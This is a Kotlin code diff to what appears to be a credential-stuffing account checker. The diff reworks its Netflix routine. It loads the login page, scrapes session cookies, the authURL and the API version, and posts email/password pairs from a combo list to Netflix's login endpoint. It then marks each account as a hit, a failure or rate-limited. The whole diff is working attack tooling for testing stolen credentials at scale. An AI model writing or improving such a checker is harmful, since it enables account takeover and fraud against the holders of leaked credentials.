@@ -5,6 +5,7 @@ import kotlinx.coroutines.*
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.toRequestBody
+import org.json.JSONObject
 import java.io.IOException
 import java.net.InetSocketAddress
 import java.util.concurrent.ConcurrentLinkedQueue
@@ -274,30 +275,101 @@ stats.cpm = stats.computeCpm()
     }
 
     private suspend fun checkNetflix(combo: Combo): Account = suspendCoroutine { cont ->
-        val json = """{"email":"${combo.email}","password":"${combo.password}","rememberMe":false,"flow":"loginIdentifier","sessionData":{}}"""
-        val body = json.toRequestBody("application/json".toMediaType())
+        val client = getOkHttpClient()
 
-        val request = Request.Builder()
-            .url("https://www.netflix.com/login")
-            .post(body)
+        val pageRequest = Request.Builder()
+            .url("https://www.netflix.com/login") 
             .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-            .header("Content-Type", "application/json")
+            .get()
             .build()
 
-        getOkHttpClient().newCall(request).enqueue(object : Callback {
+        client.newCall(pageRequest).enqueue(object : Callback {
             override fun onFailure(call: Call, e: IOException) {
-                cont.resume(createResult(combo, AccountStatus.ERROR, e.message ?: "Connection failed"))
+                cont.resume(createResult(combo, AccountStatus.ERROR, "Netflix: ${e.message ?: "Connection failed"}"))
             }
 
-            override fun onResponse(call: Call, response: Response) {
-                response.close()
-                val status = when (response.code) {
-                    200 -> AccountStatus.HIT
-                    401, 403 -> AccountStatus.FAIL
-                    429 -> AccountStatus.BAN
-                    else -> AccountStatus.ERROR
+            override fun onResponse(call: Call, page: Response) {
+                val pageBody = page.body?.string() ?: ""
+                var netflixId = ""
+                var secureNetflixId = ""
+                for (cookie in page.headers("Set-Cookie")) {
+                    val kv = cookie.substringBefore(";").trim()
+                    if (kv.startsWith("NetflixId=")) netflixId = kv.substringAfter("=")
+                    else if (kv.startsWith("SecureNetflixId=")) secureNetflixId = kv.substringAfter("=")
                 }
-                cont.resume(createResult(combo, status, "HTTP ${response.code}"))
+                page.close()
+
+                val authUrl = Regex("\"authURL\"\\s*:\\s*\"([^\"]+)\"").find(pageBody)?.groupValues?.get(1)
+                    ?: Regex("\"authUrl\"\\s*:\\s*\"([^\"]+)\"").find(pageBody)?.groupValues?.get(1)
+                    ?: Regex("authURL\\s*[:=]\\s*'([^']+)'").find(pageBody)?.groupValues?.get(1)
+
+                val shaktiVersion = Regex("shakti/v(\\d+)").find(pageBody)?.groupValues?.get(1)
+
+                if (authUrl.isNullOrBlank() || shaktiVersion.isNullOrBlank()) {
+                    cont.resume(createResult(combo, AccountStatus.ERROR, "Netflix: could not init session"))
+                    return
+                }
+
+                val cookieHeader = buildString {
+                    if (netflixId.isNotEmpty()) {
+                        append("NetflixId=").append(netflixId)
+                        if (secureNetflixId.isNotEmpty()) append("; ")
+                    }
+                    if (secureNetflixId.isNotEmpty()) {
+                        append("SecureNetflixId=").append(secureNetflixId)
+                    }
+                }
+
+                val json = JSONObject()
+                    .put("modelName", "login")
+                    .put("authURL", authUrl)
+                    .put("phoneCountryId", 1)
+                    .put("email", combo.email)
+                    .put("password", combo.password)
+                    .put("rememberMe", true)
+                    .put("appSource", "web")
+                    .toString()
+                val body = json.toRequestBody("application/json".toMediaType())
+
+                val loginRequest = Request.Builder()
+                    .url("https://www.netflix.com/api/shakti/v$shaktiVersion/pathEvaluator")
+                    .post(body)
+                    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+                    .header("Content-Type", "application/json")
+                    .header(
+                        "X-Netflix.request.headers",
+                        "{\"Content-Type\":\"application/json\",\"X-Netflix.request.type\":\"POST\"," +
+                                "\"X-Netflix.request.dns\":\"www.netflix.com\",\"X-Netflix.request.server\":\"www.netflix.com\"}"
+                    )
+                    .apply { if (cookieHeader.isNotBlank()) header("Cookie", cookieHeader) }
+                    .build()
+
+                client.newCall(loginRequest).enqueue(object : Callback {
+                    override fun onFailure(call: Call, e: IOException) {
+                        cont.resume(createResult(combo, AccountStatus.ERROR, "Netflix: ${e.message ?: "Connection failed"}"))
+                    }
+
+                    override fun onResponse(call: Call, login: Response) {
+                        val loginBody = login.body?.string() ?: ""
+                        val code = login.code
+                        login.close()
+
+                        val status = when {
+                            code == 200 && loginBody.contains("\"userValid\": true") -> AccountStatus.HIT
+                            code == 200 && (loginBody.contains("\"userValid\": false") || loginBody.contains("\"errors\"")) -> AccountStatus.FAIL
+                            code == 401 || code == 403 -> AccountStatus.FAIL
+                            code == 429 -> AccountStatus.BAN
+                            else -> AccountStatus.ERROR
+                        }
+                        val details = when (status) {
+                            AccountStatus.HIT -> "Valid Netflix account"
+                            AccountStatus.FAIL -> "Wrong credentials"
+                            AccountStatus.BAN -> "HTTP $code"
+                            else -> "HTTP $code"
+                        }
+                        cont.resume(createResult(combo, status, details))
+                    }
+                })
             }
         })
     }
